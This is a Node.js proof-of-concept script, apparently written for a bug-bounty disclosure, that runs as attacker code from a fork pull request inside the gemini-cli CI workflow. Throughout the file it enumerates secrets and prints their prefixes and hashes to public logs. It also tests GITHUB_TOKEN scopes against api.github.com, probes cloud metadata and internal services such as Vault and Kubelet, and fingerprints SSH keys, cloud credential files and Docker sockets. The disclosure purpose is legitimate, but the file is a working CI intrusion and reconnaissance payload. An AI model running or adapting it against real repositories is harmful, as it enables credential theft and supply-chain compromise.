/* eslint-disable */
/*
 * OSS VRP follow-up PoC for google-gemini/gemini-cli.
 *
 * Reproduces the workflow_run + artifact-passed checkout chain documented in
 * the previously-closed VRP report. Demonstrates that GEMINI_API_KEY (and
 * other secrets in the chained_e2e job context) are accessible to attacker
 * code running from a fork PR's package.json scripts.
 *
 * SAFETY:
 *   - Workflow logs on public PRs are world-readable. All sensitive contents
 *     (secret values, file contents, API tokens) are HASHED with SHA-256 and
 *     only the first 16 hex chars + length are printed.
 *   - For env vars matching credential patterns: length, sha256_prefix, and
 *     first 4 chars only.
 *   - HTTP probes return status code only (no response body).
 *   - File checks return existence + size + sha256_prefix only (never
 *     contents).
 *   - All network operations have a 2-second timeout.
 *   - All commands are wrapped in try/catch and exit 0 to keep the workflow
 *     job green.
 *   - No data exfiltration (no outbound HTTP except to documented Google /
 *     cloud metadata endpoints for HTTP-status enumeration).
 *   - No GCP / GitHub credentials are exercised — only enumerated.
 *
 * Triagers can re-run the workflow themselves to view verbose contents, or
 * contact the reporter for a private channel disclosure.
 */

'use strict';

const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');
const child_process = require('child_process');
const http = require('http');
const https = require('https');

const PHASE = process.argv[2] || 'unknown';

function hashStr(s) {
  return crypto
    .createHash('sha256')
    .update(String(s))
    .digest('hex')
    .slice(0, 16);
}

function safeRun(cmd) {
  try {
    return child_process
      .execSync(cmd, { stdio: ['ignore', 'pipe', 'pipe'], timeout: 5000 })
      .toString()
      .trim();
  } catch (e) {
    return `<ERR: ${e.code || e.message || 'unknown'}>`;
  }
}

function probeHttp(urlStr, timeoutMs) {
  return new Promise((resolve) => {
    let url;
    try {
      url = new URL(urlStr);
    } catch {
      return resolve({ url: urlStr, status: 'BAD_URL', err: null });
    }
    const lib = url.protocol === 'https:' ? https : http;
    const req = lib.request(
      {
        method: 'HEAD',
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: url.pathname + (url.search || ''),
        headers: {
          'User-Agent': 'oss-vrp-poc-enum/1.0',
          'Metadata-Flavor': 'Google',
          Metadata: 'true',
        },
        timeout: timeoutMs,
        rejectUnauthorized: false,
      },
      (res) => {
        resolve({ url: urlStr, status: res.statusCode, err: null });
        res.resume();
      },
    );
    req.on('error', (e) => resolve({ url: urlStr, status: null, err: e.code || e.message }));
    req.on('timeout', () => {
      req.destroy();
      resolve({ url: urlStr, status: null, err: 'TIMEOUT' });
    });
    req.end();
  });
}

function fileInfo(p) {
  try {
    const st = fs.statSync(p);
    if (!st.isFile() && !st.isSocket() && !st.isCharacterDevice() && !st.isBlockDevice()) {
      return { path: p, exists: false };
    }
    let hash = null;
    if (st.isFile()) {
      try {
        const buf = fs.readFileSync(p);
        hash = hashStr(buf);
      } catch (e) {
        hash = `<ERR: ${e.code}>`;
      }
    }
    return {
      path: p,
      exists: true,
      kind: st.isFile() ? 'file' : st.isSocket() ? 'socket' : 'special',
      size: st.size,
      mode: '0' + (st.mode & 0o7777).toString(8),
      uid: st.uid,
      gid: st.gid,
      content_sha256_prefix: hash,
    };
  } catch (e) {
    return { path: p, exists: false };
  }
}

const CRED_PATTERN = /^(GEMINI|GITHUB|GH|GOOGLE|API|TOKEN|KEY|SECRET|PAT|AWS|AZURE|GCP|NPM|DOCKER|CI|ACTIONS|RUNNER)/i;

function inventoryEnv() {
  const allNames = Object.keys(process.env).sort();
  const credLike = allNames.filter((n) => CRED_PATTERN.test(n));
  return { allNames, credLike };
}

function printHeader(label) {
  console.log('\n' + '='.repeat(72));
  console.log(`[PoC FOLLOWUP — ${PHASE}] ${label}`);
  console.log('='.repeat(72));
}

(async function main() {
  console.log('\n' + '#'.repeat(72));
  console.log(`# [PoC FOLLOWUP] gemini-cli — read-only access boundary enum`);
  console.log(`# Phase: ${PHASE}`);
  console.log(`# Public-log safety: sensitive contents HASHED, not printed.`);
  console.log(`# Repo:     ${process.env.GITHUB_REPOSITORY}`);
  console.log(`# Run ID:   ${process.env.GITHUB_RUN_ID}`);
  console.log(`# Workflow: ${process.env.GITHUB_WORKFLOW}`);
  console.log(`# Job:      ${process.env.GITHUB_JOB}`);
  console.log(`# Event:    ${process.env.GITHUB_EVENT_NAME}`);
  console.log(`# Actor:    ${process.env.GITHUB_ACTOR}`);
  console.log('#'.repeat(72));

  // -------------------------------------------------------------------------
  // [1] Runner identity — self-hosted vs GitHub-Larger-Runner
  // -------------------------------------------------------------------------
  printHeader('[1] Runner identity');
  console.log(`RUNNER_NAME:         ${process.env.RUNNER_NAME}`);
  console.log(`RUNNER_OS:           ${process.env.RUNNER_OS}`);
  console.log(`RUNNER_ARCH:         ${process.env.RUNNER_ARCH}`);
  console.log(`RUNNER_ENVIRONMENT:  ${process.env.RUNNER_ENVIRONMENT}`);
  console.log(`RUNNER_TEMP:         ${process.env.RUNNER_TEMP}`);
  console.log(`RUNNER_TOOL_CACHE:   ${process.env.RUNNER_TOOL_CACHE}`);
  console.log(`RUNNER_WORKSPACE:    ${process.env.RUNNER_WORKSPACE}`);
  console.log(`os.hostname():       ${os.hostname()}`);
  console.log(`os.userInfo:         ${JSON.stringify(os.userInfo())}`);
  console.log(`os.platform/arch:    ${os.platform()}/${os.arch()}`);
  console.log(`os.release:          ${os.release()}`);
  console.log(`os.totalmem (MB):    ${Math.round(os.totalmem() / 1024 / 1024)}`);
  console.log(`os.cpus count:       ${os.cpus().length}`);
  console.log(`os.networkInterfaces (names): ${Object.keys(os.networkInterfaces()).join(',')}`);
  console.log(`whoami:              ${safeRun('whoami')}`);
  console.log(`id:                  ${safeRun('id')}`);
  console.log(`pwd:                 ${safeRun('pwd')}`);
  console.log(`uname -a:            ${safeRun('uname -a')}`);
  console.log(`/etc/os-release:`);
  console.log(safeRun('cat /etc/os-release 2>/dev/null | head -10'));
  console.log(`/etc/hostname:`);
  console.log(safeRun('cat /etc/hostname 2>/dev/null'));
  console.log(`hostname -f:         ${safeRun('hostname -f')}`);
  console.log(`mount | head -10:`);
  console.log(safeRun('mount 2>/dev/null | head -10'));

  // -------------------------------------------------------------------------
  // [2] Env var inventory — names + lengths only for non-cred vars
  // -------------------------------------------------------------------------
  printHeader('[2] Env var inventory (names + lengths only)');
  const { allNames, credLike } = inventoryEnv();
  console.log(`Total env vars: ${allNames.length}`);
  console.log(`Credential-pattern matches: ${credLike.length}`);
  console.log(`\n--- non-credential env names + lengths (alphabetical) ---`);
  for (const name of allNames) {
    if (CRED_PATTERN.test(name)) continue;
    const len = (process.env[name] || '').length;
    console.log(`  ${name}=<len=${len}>`);
  }

  // -------------------------------------------------------------------------
  // [3] Credential-pattern env vars — length + first 4 chars + sha256
  // -------------------------------------------------------------------------
  printHeader('[3] Credential-pattern env vars (length + prefix + hash)');
  for (const name of credLike) {
    const v = process.env[name] || '';
    const len = v.length;
    const prefix = v.slice(0, 4);
    const sha = hashStr(v);
    console.log(`  ${name}: length=${len}  first4=${JSON.stringify(prefix)}  sha256_prefix=${sha}`);
  }

  // -------------------------------------------------------------------------
  // [4] Specifically GEMINI_API_KEY — match against documented format
  // -------------------------------------------------------------------------
  printHeader('[4] GEMINI_API_KEY format check');
  const k = process.env.GEMINI_API_KEY || '';
  console.log(`  GEMINI_API_KEY present:  ${k.length > 0}`);
  console.log(`  length:                  ${k.length}`);
  console.log(`  first 4 chars:           ${JSON.stringify(k.slice(0, 4))}`);
  console.log(`  sha256_prefix:           ${k ? hashStr(k) : 'N/A'}`);
  const looksLikeGoogleApiKey = k.length === 39 && k.startsWith('AIza');
  console.log(`  matches "AIza"+39 format: ${looksLikeGoogleApiKey}`);
  console.log(`  (Google API key format documented at https://ai.google.dev/gemini-api/docs/api-key)`);

  // -------------------------------------------------------------------------
  // [5] GITHUB_TOKEN scope check — HEAD request to api.github.com
  // -------------------------------------------------------------------------
  printHeader('[5] GITHUB_TOKEN scope check (HEAD only, no API exercise)');
  const ghTok = process.env.GITHUB_TOKEN || process.env.GH_TOKEN || '';
  if (!ghTok) {
    console.log('  GITHUB_TOKEN not present in this job env');
  } else {
    console.log(`  token length: ${ghTok.length}  sha256_prefix: ${hashStr(ghTok)}`);
    await new Promise((resolve) => {
      const req = https.request(
        {
          method: 'HEAD',
          hostname: 'api.github.com',
          path: '/repos/google-gemini/gemini-cli',
          headers: {
            Authorization: `token ${ghTok}`,
            'User-Agent': 'oss-vrp-poc-enum/1.0',
            Accept: 'application/vnd.github+json',
          },
          timeout: 5000,
        },
        (res) => {
          console.log(`  HTTP ${res.statusCode}`);
          for (const h of [
            'x-oauth-scopes',
            'x-accepted-oauth-scopes',
            'x-github-token-expiration',
            'x-github-request-id',
          ]) {
            if (res.headers[h] !== undefined) {
              console.log(`  ${h}: ${res.headers[h]}`);
            }
          }
          res.resume();
          resolve();
        },
      );
      req.on('error', (e) => { console.log(`  ERR: ${e.code || e.message}`); resolve(); });
      req.on('timeout', () => { req.destroy(); console.log('  TIMEOUT'); resolve(); });
      req.end();
    });
  }

  // -------------------------------------------------------------------------
  // [6] Cloud metadata probes — HTTP status only, no body
  // -------------------------------------------------------------------------
  printHeader('[6] Cloud metadata probes (HTTP status only)');
  const metadataTargets = [
    'http://169.254.169.254/',                              // AWS / Azure IMDS
    'http://169.254.169.254/latest/meta-data/',            // AWS IMDSv1
    'http://169.254.169.254/metadata/instance?api-version=2021-02-01', // Azure
    'http://metadata.google.internal/',                     // GCP
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://metadata/computeMetadata/v1/instance/',         // GCP short
    'http://100.100.100.200/',                              // Alibaba Cloud
    'http://169.254.170.2/',                                // ECS task metadata
  ];
  for (const u of metadataTargets) {
    const r = await probeHttp(u, 2000);
    console.log(`  ${u}  ->  status=${r.status}  err=${r.err || '-'}`);
  }

  // -------------------------------------------------------------------------
  // [7] Cached credential file existence on the runner
  // -------------------------------------------------------------------------
  printHeader('[7] Cached credential files (existence + size + sha256_prefix)');
  const home = os.homedir();
  const credFiles = [
    `${home}/.docker/config.json`,
    `${home}/.aws/credentials`,
    `${home}/.aws/config`,
    `${home}/.gcloud/application_default_credentials.json`,
    `${home}/.config/gcloud/application_default_credentials.json`,
    `${home}/.config/gcloud/credentials.db`,
    `${home}/.kube/config`,
    `${home}/.npmrc`,
    `${home}/.config/gh/hosts.yml`,
    `${home}/.cargo/credentials`,
    `${home}/.cargo/credentials.toml`,
    `${home}/.gitconfig`,
    `${home}/.netrc`,
    `${home}/.ssh/id_rsa`,
    `${home}/.ssh/id_ed25519`,
    `${home}/.ssh/known_hosts`,
    `${home}/.ssh/authorized_keys`,
    '/etc/docker/daemon.json',
    '/etc/kubernetes/admin.conf',
    '/var/run/secrets/kubernetes.io/serviceaccount/token',
    '/run/secrets/kubernetes.io/serviceaccount/token',
  ];
  for (const f of credFiles) {
    const info = fileInfo(f);
    if (info.exists) {
      console.log(
        `  EXISTS  ${f}  kind=${info.kind} size=${info.size} mode=${info.mode} uid=${info.uid}/gid=${info.gid} sha256_prefix=${info.content_sha256_prefix}`,
      );
    }
  }
  console.log('  (paths not listed above were not present)');

  // -------------------------------------------------------------------------
  // [8] Docker socket exposure
  // -------------------------------------------------------------------------
  printHeader('[8] Docker / container runtime exposure');
  for (const sock of [
    '/var/run/docker.sock',
    '/run/podman/podman.sock',
    '/run/containerd/containerd.sock',
    '/var/run/crio/crio.sock',
  ]) {
    const info = fileInfo(sock);
    if (info.exists) {
      console.log(`  EXISTS  ${sock}  kind=${info.kind} mode=${info.mode} uid=${info.uid}/gid=${info.gid}`);
    }
  }

  // -------------------------------------------------------------------------
  // [9] Internal network reachability — HTTP status only
  // -------------------------------------------------------------------------
  printHeader('[9] Internal network reachability (HTTP status only)');
  const netTargets = [
    'http://localhost:80/',
    'http://localhost:8080/',
    'http://localhost:3000/',
    'http://localhost:5000/',
    'http://localhost:8500/',  // Consul
    'http://localhost:8200/',  // Vault
    'http://localhost:9090/',  // Prometheus
    'http://localhost:9100/',  // node_exporter
    'http://localhost:2375/',  // Docker daemon TCP
    'http://localhost:10250/', // Kubelet
    'http://10.0.0.1/',
    'http://172.17.0.1/',      // default Docker bridge gateway
    'http://192.168.1.1/',
  ];
  for (const u of netTargets) {
    const r = await probeHttp(u, 2000);
    if (r.status !== null || (r.err && r.err !== 'ECONNREFUSED' && r.err !== 'TIMEOUT' && r.err !== 'EHOSTUNREACH' && r.err !== 'ENETUNREACH')) {
      console.log(`  ${u}  ->  status=${r.status}  err=${r.err || '-'}`);
    }
  }
  console.log('  (probes returning ECONNREFUSED / TIMEOUT / unreachable are omitted)');

  // -------------------------------------------------------------------------
  // [10] ACTIONS_RUNTIME_TOKEN + ACTIONS_CACHE_URL presence
  //      (these are the cache/artifact API credentials — combined with
  //       workflow_run pivot, could enable cache poisoning of main-branch CI)
  // -------------------------------------------------------------------------
  printHeader('[10] Actions runtime token + cache URL');
  for (const name of [
    'ACTIONS_RUNTIME_TOKEN',
    'ACTIONS_RUNTIME_URL',
    'ACTIONS_CACHE_URL',
    'ACTIONS_RESULTS_URL',
    'ACTIONS_ID_TOKEN_REQUEST_URL',
    'ACTIONS_ID_TOKEN_REQUEST_TOKEN',
  ]) {
    const v = process.env[name];
    if (v) {
      console.log(`  ${name}: present  length=${v.length}  sha256_prefix=${hashStr(v)}`);
    } else {
      console.log(`  ${name}: not present`);
    }
  }

  // -------------------------------------------------------------------------
  // [11] Workspace state — was attacker code actually checked out?
  // -------------------------------------------------------------------------
  printHeader('[11] Workspace state — confirm attacker checkout');
  console.log(`  process.cwd:  ${process.cwd()}`);
  console.log(`  GITHUB_WORKSPACE:  ${process.env.GITHUB_WORKSPACE}`);
  console.log(`  __dirname:    ${__dirname}`);
  console.log(`  __filename:   ${__filename}`);
  console.log(`  git rev-parse HEAD: ${safeRun('git rev-parse HEAD')}`);
  console.log(`  git config remote.origin.url: ${safeRun('git config remote.origin.url')}`);
  console.log(`  git log -1 --format=%an,%ae,%s: ${safeRun("git log -1 --format='%an,%ae,%s'")}`);

  console.log('\n' + '#'.repeat(72));
  console.log(`# [PoC FOLLOWUP — ${PHASE}] END`);
  console.log('# No data exfiltrated. No resources modified. No secrets logged.');
  console.log('# All sensitive values were SHA-256 hashed; only first 16 hex chars + length.');
  console.log('# Triagers may re-run this workflow to view verbose output.');
  console.log('#'.repeat(72));
})()
  .catch((e) => {
    console.error(`[PoC FOLLOWUP — ${PHASE}] fatal: ${e && (e.stack || e.message || e)}`);
  })
  .finally(() => {
    process.exit(0);
  });
